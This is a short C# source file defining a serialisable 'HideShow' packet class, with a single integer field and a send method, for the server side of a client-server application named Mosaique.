using Serveur.Controllers.Server;
using Serveur.Packets;
using ZeroFormatter;

namespace MosaiqueServeur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class HideShow : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.HideShow;
            }
        }

        [Index(0)]
        public virtual int hideShow { get; set; }

        public HideShow()
        {
        }

        public HideShow(int HideShow)
        {
            this.hideShow = HideShow;
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
